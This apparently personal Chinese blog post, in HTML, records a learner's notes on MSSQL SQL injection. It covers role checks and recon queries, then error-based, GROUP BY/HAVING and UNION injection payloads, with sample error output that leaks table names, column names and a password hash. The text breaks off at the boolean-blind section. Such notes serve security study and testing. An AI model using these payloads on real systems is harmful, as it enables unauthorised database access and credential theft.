@@ -1,0 +1,710 @@
+<!DOCTYPE html><html lang="en" theme-mode="dark"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>sql注入学习--拓展 | hybcx's blog</title><link rel="icon" type="image/x-icon" href="/favicon.ico"><script>var config = {"root":"/","search":{"preload":false,"activeHolder":"键入以继续","blurHolder":"数据检索","noResult":"无 $0 相关数据"},"code":{"codeInfo":"$0 - $1 行","copy":"code.copy","copyFinish":"code.copyFinish","expand":"code.expand"}}</script><link rel="stylesheet" href="//unpkg.com/@waline/client@v2/dist/waline.css"><script src="//unpkg.com/mermaid@9.2.2/dist/mermaid.min.js"></script><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lightgallery.css"><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lg-zoom.css"><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lg-thumbnail.css"><link type="text/css" rel="stylesheet" href="/lib/fontawesome/css/all.min.css"><link rel="stylesheet" href="/css/arknights.css"><script>if (window.localStorage.getItem('theme-mode') === 'light') document.documentElement.setAttribute('theme-mode', 'light')
+if (window.localStorage.getItem('theme-mode') === 'dark') document.documentElement.setAttribute('theme-mode', 'dark')</script><style>@font-face {
+ font-family: BenderLight;
+ src: local('Bender'), url("/font/BenderLight.ttf");
+}
+@font-face {
+ font-family: 'JetBrains Mono';
+ src: local('JetBrains Mono'), url('/font/JetBrainsMono-Regular.woff2') format('woff2');
+}</style><style>:root {
+  --dark-background: url('https://ak.hypergryph.com/assets/index/images/ak/pc/bk.jpg');
+  --light-background: url('/img/bk.jpg');
+}</style><meta name="generator" content="Hexo 6.3.0"></head><body><div class="loading" style="opacity: 0;"><div class="loadingBar left"></div><div class="loadingBar right"></div></div><main><header class="closed"><nav><div class="navBtn"><i class="navBtnIcon"><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span></i></div><div class="navItem" id="search-header"><span class="navItemTitle"><input autocomplete="off" autocorrect="off" autocapitalize="none" placeholder="数据检索" spellcheck="false" maxlength="50" type="text" id="search-input"></span></div><div class="navItem" id="search-holder"></div><div class="search-popup"><div id="search-result"></div></div><ol class="navContent"><li class="navItem"><a class="navBlock" href="/"><span class="navItemTitle">Home</span></a></li><li class="navItem" matchdata="categories,tags"><a class="navBlock" href="/archives/"><span class="navItemTitle">Archives</span></a></li><li class="navItem"><a class="navBlock" href="/friends/"><span class="navItemTitle">Friends</span></a></li><li class="navItem"><a class="navBlock" href="/about"><span class="navItemTitle">About</span></a></li></ol></nav></header><div id="shadow-header"></div><article><div id="post-bg"><div id="post-title"><h1>sql注入学习--拓展</h1><div id="post-info"><span>文章发布时间: <div class="control"><time datetime="2023-10-15T00:30:58.768Z" id="date"> 2023-10-15</time></div></span><br><span>最后更新时间: <div class="control"><time datetime="2023-10-15T04:19:46.991Z" id="updated"> 2023-10-15</time></div></span><br><span>文章总字数: <div class="control">8.8k</div></span><br><span>预计阅读时间: <div class="control">37 分钟</div></span></div></div><hr><div id="post-content"><h1>0x01 前言</h1>
+<p>撰写本篇的目的是为了进一步了解一下sql注入的其他类型，mssql、postgresql、db2等等，主要是认为了解且会用手工注入才是前提也是重点，不能完全利用工具。因此写下本文来记录常规的、常见的数据库类型的相关注入payload，让自己以后遇到的时候不会懵逼。</p>
+<h1>0x02 Msssql</h1>
+<h2 id="2-1-环境搭建"><a href="#2-1-环境搭建" class="headerlink" title="2-1-环境搭建"></a>2.1 环境搭建</h2>
+<p>哎呀，这一块看着真麻烦，我本是想能实操就实操一下，但这么麻烦感觉还是算了，我初心只是想了解一下语句emmm，那就多用脑子想想吧。</p>
+<p>下面都是跟着y4er师傅学习的┭┮﹏┭┮太强啦！！！</p>
+<h2 id="2-2-自带库介绍"><a href="#2-2-自带库介绍" class="headerlink" title="2-2-自带库介绍"></a>2.2 自带库介绍</h2>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">master   //用于记录所有SQL Server系统级别的信息，这些信息用于控制用户数据库和数据操作。<br><br>model    //SQL Server为用户数据库提供的样板，新的用户数据库都以model数据库为基础<br><br>msdb     //由 Enterprise Manager和Agent使用，记录着任务计划信息、事件处理信息、数据备份及恢复信息、警告及异常信息。<br><br>tempdb   //它为临时表和其他临时工作提供了一个存储区。<br></code></pre></td></tr></table></figure>
+<p>其中最主要的是<code>master</code>数据库，其中存储了所有的数据库名等，还有很多<code>存储过程</code></p>
+<blockquote>
+<p>存储过程是一组为了完成特定功能的SQL 语句集，它存储在数据库中，一次编译后永久有效，用户通过指定存储过程的名字并给出参数（如果该存储过程带有参数）来执行它。实际上就是一个封装好的函数，具有面向对象特点。</p>
+</blockquote>
+<p class='item-img' data-src='image-20231015091759377.png'><img src="image-20231015091759377.png" alt="image-20231015091759377"></p>
+<p>在master数据库中有<code>master.dbo.sysdatabases</code>视图，储存所有数据库名,其他数据库的视图则储存他本库的表名与列名。 每一个库的视图表都有<code>syscolumns</code>存储着所有的字段，可编程性储存着我们的函数。</p>
+<p>mssql的存储过程天然支持多语句，为我们的注入提供了遍历。</p>
+<p>增删改查和MySQL数据库大同小异，具体可以自行w3c。</p>
+<h2 id="2-3-信息搜集"><a href="#2-3-信息搜集" class="headerlink" title="2-3-信息搜集"></a>2.3 信息搜集</h2>
+<p>先来了解下mssql中有哪些角色/权限</p>
+<p>以下摘自<a target="_blank" rel="noopener" href="https://docs.microsoft.com/zh-cn/sql/relational-databases/security/authentication-access/server-level-roles?view=sql-server-2017">官网文档</a></p>
+<p>这里留着日后有需要在查看，脑子里有个大概印象</p>
+<table>
+<thead>
+<tr>
+<th style="text-align:left">服务器级的固定角色</th>
+<th style="text-align:left">描述</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:left">sysadmin</td>
+<td style="text-align:left">sysadmin 固定服务器角色的成员可以在服务器上执行任何活动。</td>
+</tr>
+<tr>
+<td style="text-align:left">serveradmin</td>
+<td style="text-align:left">serveradmin 固定服务器角色的成员可以更改服务器范围的配置选项和关闭服务器。</td>
+</tr>
+<tr>
+<td style="text-align:left">securityadmin</td>
+<td style="text-align:left">securityadmin 固定服务器角色的成员可以管理登录名及其属性。 他们可以 <code>GRANT</code>、<code>DENY</code> 和 <code>REVOKE</code> 服务器级权限。 他们还可以 <code>GRANT</code>、<code>DENY</code> 和 <code>REVOKE</code> 数据库级权限（如果他们具有数据库的访问权限）。 此外，他们还可以重置 SQL Server 登录名的密码。 重要说明： 如果能够授予对 数据库引擎 的访问权限和配置用户权限，安全管理员可以分配大多数服务器权限。 securityadmin 角色应视为与 sysadmin 角色等效。</td>
+</tr>
+<tr>
+<td style="text-align:left">processadmin</td>
+<td style="text-align:left">processadmin 固定服务器角色的成员可以终止在 SQL Server 实例中运行的进程。</td>
+</tr>
+<tr>
+<td style="text-align:left">setupadmin</td>
+<td style="text-align:left">setupadmin 固定服务器角色的成员可以使用 Transact-SQL 语句添加和删除链接服务器。 （使用 Management Studio 时需要 sysadmin 成员资格。）</td>
+</tr>
+<tr>
+<td style="text-align:left">bulkadmin</td>
+<td style="text-align:left">bulkadmin 固定服务器角色的成员可以运行 <code>BULK INSERT</code> 语句。</td>
+</tr>
+<tr>
+<td style="text-align:left">diskadmin</td>
+<td style="text-align:left">diskadmin 固定服务器角色用于管理磁盘文件。</td>
+</tr>
+<tr>
+<td style="text-align:left">dbcreator</td>
+<td style="text-align:left">dbeator 固务器角色的成员可以创建、更改、删除和还原任何数据库。</td>
+</tr>
+<tr>
+<td style="text-align:left">puic</td>
+<td style="text-align:left">每个 SQL Server 登录名都属于 public 服务器角色。 如果未向某个服务器主体授予或拒绝对某个安全对象的特定权限，该用户将继承授予该对象的 public 角色的权限。 只有在希望所有用户都能使用对象时，才在对象上分配 Public 权限。 你无法更改具有 Public 角色的成员身份。 注意plic 与其他角色的实现方式不同，可通过 public 固定服务器角色授予、拒绝或调用权限。</td>
+</tr>
+</tbody>
+</table>
+<table>
+<thead>
+<tr>
+<th style="text-align:left">固定数据库角色名</th>
+<th style="text-align:left">描述</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:left">db_owner</td>
+<td style="text-align:left">db_owner 固定数据库角色的成员可以执行数据库的所有配置和维护活动，还可以删除 SQL Server中的数据库。 （在 SQL 数据库 和 SQL 数据仓库中，某些维护活动需要服务器级别权限，并且不能由 db_owners执行。）</td>
+</tr>
+<tr>
+<td style="text-align:left">db_securityadmin</td>
+<td style="text-align:left">db_securityadmin 固定数据库角色的成员可以仅修改自定义角色的角色成员资格、创建无登录名的用户和管理权限。 向此角色中添加主体可能会导致意外的权限升级。</td>
+</tr>
+<tr>
+<td style="text-align:left">db_accessadmin</td>
+<td style="text-align:left">db_accessadmin 固定数据库角色的成员可以为 Windows 登录名、Windows 组和 SQL Server 登录名添加或删除数据库访问权限。</td>
+</tr>
+<tr>
+<td style="text-align:left">db_backupoperator</td>
+<td style="text-align:left">db_backupoperator 固定数据库角色的成员可以备份数据库。</td>
+</tr>
+<tr>
+<td style="text-align:left">db_ddladmin</td>
+<td style="text-align:left">db_ddladmin 固定数据库角色的成员可以在数据库中运行任何数据定义语言 (DDL) 命令。</td>
+</tr>
+<tr>
+<td style="text-align:left">db_datawriter</td>
+<td style="text-align:left">db_datawriter 固定数据库角色的成员可以在所有用户表中添加、删除或更改数据。</td>
+</tr>
+<tr>
+<td style="text-align:left">db_datareader</td>
+<td style="text-align:left">db_datareader 固定数据库角色的成员可以从所有用户表中读取所有数据。</td>
+</tr>
+<tr>
+<td style="text-align:left">db_denydatawriter</td>
+<td style="text-align:left">db_denydatawriter 固定数据库角色的成员不能添加、修改或删除数据库内用户表中的任何数据。</td>
+</tr>
+<tr>
+<td style="text-align:left">db_denydatareader</td>
+<td style="text-align:left">db_denydatareader 固定数据库角色的成员不能读取数据库内用户表中的任何数据。</td>
+</tr>
+</tbody>
+</table>
+<p>我们可以用<code>IS_SRVROLEMEMBER</code>来判断服务器级别的固定角色</p>
+<table>
+<thead>
+<tr>
+<th style="text-align:left">返回值</th>
+<th style="text-align:left">描述</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:left">0</td>
+<td style="text-align:left">login 不是 role 的成员。</td>
+</tr>
+<tr>
+<td style="text-align:left">1</td>
+<td style="text-align:left">login 是 role 的成员。</td>
+</tr>
+<tr>
+<td style="text-align:left">NULL</td>
+<td style="text-align:left">role 或 login 无效，或者没有查看角色成员身份的权限。</td>
+</tr>
+</tbody>
+</table>
+<p>构造语句</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">and</span> <span class="hljs-number">1</span><span class="hljs-operator">=</span>(<span class="hljs-keyword">select</span> is_srvrolemember(<span class="hljs-string">&#x27;sysadmin&#x27;</span>))<br><br><span class="hljs-keyword">and</span> <span class="hljs-number">1</span><span class="hljs-operator">=</span>(<span class="hljs-keyword">select</span> is_srvrolemember(<span class="hljs-string">&#x27;serveradmin&#x27;</span>))<br><br><span class="hljs-keyword">and</span> <span class="hljs-number">1</span><span class="hljs-operator">=</span>(<span class="hljs-keyword">select</span> is_srvrolemember(<span class="hljs-string">&#x27;setupadmin&#x27;</span>))<br><br><span class="hljs-keyword">and</span> <span class="hljs-number">1</span><span class="hljs-operator">=</span>(<span class="hljs-keyword">select</span> is_srvrolemember(<span class="hljs-string">&#x27;securityadmin&#x27;</span>))<br><br><span class="hljs-keyword">and</span> <span class="hljs-number">1</span><span class="hljs-operator">=</span>(<span class="hljs-keyword">select</span> is_srvrolemember(<span class="hljs-string">&#x27;diskadmin&#x27;</span>))<br><br><span class="hljs-keyword">and</span> <span class="hljs-number">1</span><span class="hljs-operator">=</span>(<span class="hljs-keyword">select</span> is_srvrolemember(<span class="hljs-string">&#x27;bulkadmin&#x27;</span>))<br></code></pre></td></tr></table></figure>
+<p>数据库级别的应用角色用<code>IS_MEMBER</code>函数判断</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> IS_MEMBER(<span class="hljs-string">&#x27;db_owner&#x27;</span>)<br></code></pre></td></tr></table></figure>
+<p>再来看一些基本信息</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> @<span class="hljs-variable">@version</span>; <span class="hljs-operator">/</span><span class="hljs-operator">/</span>版本<br><span class="hljs-keyword">SELECT</span> <span class="hljs-keyword">user</span>;		<span class="hljs-operator">/</span><span class="hljs-operator">/</span>用户<br><span class="hljs-keyword">SELECT</span> DB_NAME();	<span class="hljs-operator">/</span><span class="hljs-operator">/</span>当前数据库名，你可以用db_name(n)来遍历出所有的数据库<br><span class="hljs-keyword">SELECT</span> @<span class="hljs-variable">@servername</span>;	<span class="hljs-operator">/</span><span class="hljs-operator">/</span>主机名<br></code></pre></td></tr></table></figure>
+<p>那么站库分离可以这么来判断</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> <span class="hljs-keyword">user</span> <span class="hljs-keyword">where</span> id<span class="hljs-operator">=</span><span class="hljs-string">&#x27;1&#x27;</span><span class="hljs-keyword">and</span> host_name()<span class="hljs-operator">=</span>@<span class="hljs-variable">@servername</span>;<span class="hljs-comment">--&#x27;</span><br></code></pre></td></tr></table></figure>
+<h2 id="2-4-符号"><a href="#2-4-符号" class="headerlink" title="2-4-符号"></a>2.4 符号</h2>
+<p>注释符</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">/* <br>--<br>;%00<br></code></pre></td></tr></table></figure>
+<p>空白符号</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">01,02,03,04,05,06,07,08,09,0A,0B,0C,0D,0E,0F,10,11,12,13,14,15,16,17,18,19,1A,1B,1C,1D,1E,1F,20	--暂时不了解为什么<br><br>/**/<br></code></pre></td></tr></table></figure>
+<p>运算</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-comment">--基本的不列举了，举几个特殊的</span><br><span class="hljs-keyword">ALL</span> 如果一组的比较都为<span class="hljs-literal">true</span>，则比较结果为<span class="hljs-literal">true</span><br><span class="hljs-keyword">AND</span> 如果两个布尔表达式都为<span class="hljs-literal">true</span>，则结果为<span class="hljs-literal">true</span>；如果其中一个表达式为<span class="hljs-literal">false</span>，则结果为<span class="hljs-literal">false</span><br><span class="hljs-keyword">ANY</span> 如果一组的比较中任何一个为<span class="hljs-literal">true</span>，则结果为<span class="hljs-literal">true</span><br><span class="hljs-keyword">BETWEEN</span> 如果操作数在某个范围之内，那么结果为<span class="hljs-literal">true</span><br><span class="hljs-keyword">EXISTS</span>  如果子查询中包含了一些行，那么结果为<span class="hljs-literal">true</span><br><span class="hljs-keyword">IN</span>  如果操作数等于表达式列表中的一个，那么结果为<span class="hljs-literal">true</span><br><span class="hljs-keyword">LIKE</span>    如果操作数与某种模式相匹配，那么结果为<span class="hljs-literal">true</span><br><span class="hljs-keyword">NOT</span> 对任何其他布尔运算符的结果值取反<br><span class="hljs-keyword">OR</span>  如果两个布尔表达式中的任何一个为<span class="hljs-literal">true</span>，那么结果为<span class="hljs-literal">true</span><br><span class="hljs-keyword">SOME</span>    如果在一组比较中，有些比较为<span class="hljs-literal">true</span>，那么结果为<span class="hljs-literal">true</span><br></code></pre></td></tr></table></figure>
+<h2 id="2-5-基本注入流程"><a href="#2-5-基本注入流程" class="headerlink" title="2-5-基本注入流程"></a>2.5 基本注入流程</h2>
+<p>此处利用mssql数据类型不一样比较报错，爆出当前数据库名</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> Fanmv_Admin <span class="hljs-keyword">WHERE</span> AdminID<span class="hljs-operator">=</span><span class="hljs-number">1</span> <span class="hljs-keyword">and</span> DB_NAME()<span class="hljs-operator">&gt;</span><span class="hljs-number">1</span>;<br></code></pre></td></tr></table></figure>
+<p>在将 nvarchar 值 ‘FanmvCMS’ 转换成数据类型 int 时失败。</p>
+<p>爆表名</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> Fanmv_Admin <span class="hljs-keyword">WHERE</span> AdminID<span class="hljs-operator">=</span><span class="hljs-number">1</span> <span class="hljs-keyword">and</span> <span class="hljs-number">1</span><span class="hljs-operator">=</span>(<span class="hljs-keyword">SELECT</span> TOP <span class="hljs-number">1</span> name <span class="hljs-keyword">from</span> sysobjects <span class="hljs-keyword">WHERE</span> xtype<span class="hljs-operator">=</span><span class="hljs-string">&#x27;u&#x27;</span>);<br></code></pre></td></tr></table></figure>
+<p>在将 nvarchar 值 ‘Fanmv_Admin’ 转换成数据类型 int 时失败。</p>
+<p>此处<code>xtype</code>可以是下列对象类型中的一种：</p>
+<table>
+<thead>
+<tr>
+<th style="text-align:center">缩写</th>
+<th style="text-align:left">全称</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:center">C</td>
+<td style="text-align:left">CHECK 约束</td>
+</tr>
+<tr>
+<td style="text-align:center">D</td>
+<td style="text-align:left">默认值或 DEFAULT 约束</td>
+</tr>
+<tr>
+<td style="text-align:center">F</td>
+<td style="text-align:left">FOREIGN KEY 约束</td>
+</tr>
+<tr>
+<td style="text-align:center">L</td>
+<td style="text-align:left">日志</td>
+</tr>
+<tr>
+<td style="text-align:center">FN</td>
+<td style="text-align:left">标量函数</td>
+</tr>
+<tr>
+<td style="text-align:center">IF</td>
+<td style="text-align:left">内嵌表函数</td>
+</tr>
+<tr>
+<td style="text-align:center">P</td>
+<td style="text-align:left">存储过程</td>
+</tr>
+<tr>
+<td style="text-align:center">PK</td>
+<td style="text-align:left">PRIMARY KEY 约束（类型是 K）</td>
+</tr>
+<tr>
+<td style="text-align:center">RF</td>
+<td style="text-align:left">复制筛选存储过程</td>
+</tr>
+<tr>
+<td style="text-align:center">S</td>
+<td style="text-align:left">系统表</td>
+</tr>
+<tr>
+<td style="text-align:center">TF</td>
+<td style="text-align:left">表函数</td>
+</tr>
+<tr>
+<td style="text-align:center">TR</td>
+<td style="text-align:left">触发器</td>
+</tr>
+<tr>
+<td style="text-align:center">U</td>
+<td style="text-align:left">用户表</td>
+</tr>
+<tr>
+<td style="text-align:center">UQ</td>
+<td style="text-align:left">UNIQUE 约束（类型是 K）</td>
+</tr>
+<tr>
+<td style="text-align:center">V</td>
+<td style="text-align:left">视图</td>
+</tr>
+<tr>
+<td style="text-align:center">X</td>
+<td style="text-align:left">扩展存储过程</td>
+</tr>
+</tbody>
+</table>
+<p>此处的<code>sysobjects</code>等同于<code>[master].[sys].[objects]</code></p>
+<p>爆列名</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> Fanmv_Admin <span class="hljs-keyword">WHERE</span> AdminID<span class="hljs-operator">=</span><span class="hljs-number">1</span> <span class="hljs-keyword">and</span> <span class="hljs-number">1</span><span class="hljs-operator">=</span>(<span class="hljs-keyword">select</span> top <span class="hljs-number">1</span> name <span class="hljs-keyword">from</span> syscolumns <span class="hljs-keyword">where</span> id<span class="hljs-operator">=</span>(<span class="hljs-keyword">select</span> id <span class="hljs-keyword">from</span> sysobjects <span class="hljs-keyword">where</span> name <span class="hljs-operator">=</span> <span class="hljs-string">&#x27;Fanmv_Admin&#x27;</span>));<br></code></pre></td></tr></table></figure>
+<p>在将 nvarchar 值 ‘AdminID’ 转换成数据类型 int 时失败。</p>
+<blockquote>
+<p>[22018] [Microsoft][SQL Server Native Client 10.0][SQL Server]在将 nvarchar 值 ‘AdminID’ 转换成数据类型 int 时失败。 (245)</p>
+</blockquote>
+<p>爆数据</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> Fanmv_Admin <span class="hljs-keyword">WHERE</span> AdminID<span class="hljs-operator">=</span><span class="hljs-number">1</span> <span class="hljs-keyword">and</span> <span class="hljs-number">1</span><span class="hljs-operator">=</span>(<span class="hljs-keyword">SELECT</span> TOP <span class="hljs-number">1</span> AdminPass <span class="hljs-keyword">from</span> Fanmv_Admin);<br></code></pre></td></tr></table></figure>
+<p>在将 varchar 值 ‘81FAAEN52MA16VBYT4Y1JJ3552BTC1640E7CF84345C86BA6’ 转换成数据类型 int 时失败。</p>
+<p>当然，在mssql中也存在<code>INFORMATION_SCHEMA</code>，你也可以通过它来查询。</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> INFORMATION_SCHEMA.TABLES<br><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> INFORMATION_SCHEMA.COLUMNS <span class="hljs-keyword">where</span> TABLE_NAME<span class="hljs-operator">=</span><span class="hljs-string">&#x27;admin&#x27;</span> <span class="hljs-keyword">and</span> <span class="hljs-number">1</span><span class="hljs-operator">=</span>(<span class="hljs-keyword">select</span> top <span class="hljs-number">1</span> table_name <span class="hljs-keyword">from</span> information_schema.tables);<span class="hljs-comment">--</span><br></code></pre></td></tr></table></figure>
+<p>判断表名更方便的一种方式是使用<code>having 1=1</code>，GROUP BY</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> Fanmv_Admin <span class="hljs-keyword">WHERE</span> AdminID<span class="hljs-operator">=</span><span class="hljs-number">1</span> <span class="hljs-keyword">having</span> <span class="hljs-number">1</span><span class="hljs-operator">=</span><span class="hljs-number">1</span><br></code></pre></td></tr></table></figure>
+<p>选择列表中的列 ‘Fanmv_Admin.AdminID’ 无效，因为该列没有包含在聚合函数或 GROUP BY 子句中。</p>
+<p>爆出一列，将其用group by 拼接进去继续往后爆其他的</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> Fanmv_Admin <span class="hljs-keyword">WHERE</span> AdminID<span class="hljs-operator">=</span><span class="hljs-number">1</span> <span class="hljs-keyword">GROUP</span> <span class="hljs-keyword">BY</span> AdminID <span class="hljs-keyword">having</span> <span class="hljs-number">1</span><span class="hljs-operator">=</span><span class="hljs-number">1</span><br></code></pre></td></tr></table></figure>
+<p>选择列表中的列 ‘Fanmv_Admin.IsSystem’ 无效，因为该列没有包含在聚合函数或 GROUP BY 子句中。</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> Fanmv_Admin <span class="hljs-keyword">WHERE</span> AdminID<span class="hljs-operator">=</span><span class="hljs-number">1</span> <span class="hljs-keyword">GROUP</span> <span class="hljs-keyword">BY</span> AdminID,IsSystem <span class="hljs-keyword">having</span> <span class="hljs-number">1</span><span class="hljs-operator">=</span><span class="hljs-number">1</span><br></code></pre></td></tr></table></figure>
+<p>选择列表中的列 ‘Fanmv_Admin.AdminName’ 无效，因为该列没有包含在聚合函数或 GROUP BY 子句中。</p>
+<p>以此爆出所有字段</p>
+<h2 id="2-6-报错注入"><a href="#2-6-报错注入" class="headerlink" title="2-6-报错注入"></a>2.6 报错注入</h2>
+<p>其实基本注入流程中用到的就是报错注入，mssql中没有报错函数，报错注入利用的就是显式或隐式的类型转换来报错</p>
+<p>先来看隐式报错</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> admin <span class="hljs-keyword">where</span> id <span class="hljs-operator">=</span><span class="hljs-number">1</span> <span class="hljs-keyword">and</span> (<span class="hljs-keyword">select</span> <span class="hljs-keyword">user</span>)<span class="hljs-operator">&gt;</span><span class="hljs-number">0</span><br></code></pre></td></tr></table></figure>
+<p>user和0进行比较时就会报错</p>
+<p>再来看显示报错，一般上显示报错用到的是<code>cast</code>和<code>convert</code>函数</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> admin <span class="hljs-keyword">where</span> id <span class="hljs-operator">=</span><span class="hljs-number">1</span> (<span class="hljs-keyword">select</span> <span class="hljs-built_in">CAST</span>(<span class="hljs-keyword">USER</span> <span class="hljs-keyword">as</span> <span class="hljs-type">int</span>))<br><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> admin <span class="hljs-keyword">where</span> id <span class="hljs-operator">=</span><span class="hljs-number">1</span> (<span class="hljs-keyword">select</span> <span class="hljs-keyword">convert</span>(<span class="hljs-type">int</span>,<span class="hljs-keyword">user</span>))<br></code></pre></td></tr></table></figure>
+<p>这里再来引入一个<code>declare</code></p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> admin <span class="hljs-keyword">where</span> id <span class="hljs-operator">=</span><span class="hljs-number">1</span>;<span class="hljs-keyword">declare</span> <span class="hljs-variable">@a</span> <span class="hljs-type">varchar</span>(<span class="hljs-number">2000</span>) <span class="hljs-keyword">set</span> <span class="hljs-variable">@a</span><span class="hljs-operator">=</span><span class="hljs-string">&#x27;select convert(int,user)&#x27;</span> <span class="hljs-keyword">exec</span>(<span class="hljs-variable">@a</span>);<br></code></pre></td></tr></table></figure>
+<p><code>declare</code>定义变量 <code>set</code>赋值<code>exec</code>执行</p>
+<h2 id="2-7-联合查询注入"><a href="#2-7-联合查询注入" class="headerlink" title="2-7-联合查询注入"></a>2.7 联合查询注入</h2>
+<p>mssql不用数字占位，因为可能会发生隐式转换，我们用null来占位，因为mssql数据库是个强类型的数据库，对数据格式比较严格。</p>
+<p>（这里也是没搞懂发生隐式转换会如何，我猜测是转换后无法查询我们想让其查询的语句了）</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> users <span class="hljs-keyword">where</span> id<span class="hljs-operator">=</span><span class="hljs-number">1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-keyword">null</span>,<span class="hljs-keyword">null</span>,DB_NAME();<br></code></pre></td></tr></table></figure>
+<p>你也可以这样来联合报错</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> users <span class="hljs-keyword">where</span> id<span class="hljs-operator">=</span><span class="hljs-number">1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-keyword">null</span>,<span class="hljs-keyword">null</span>, (<span class="hljs-keyword">select</span> <span class="hljs-built_in">CAST</span>(db_name() <span class="hljs-keyword">as</span> <span class="hljs-type">int</span>))<br></code></pre></td></tr></table></figure>
+<h2 id="2-8-布尔盲注"><a href="#2-8-布尔盲注" class="headerlink" title="2-8-布尔盲注"></a>2.8 布尔盲注</h2>
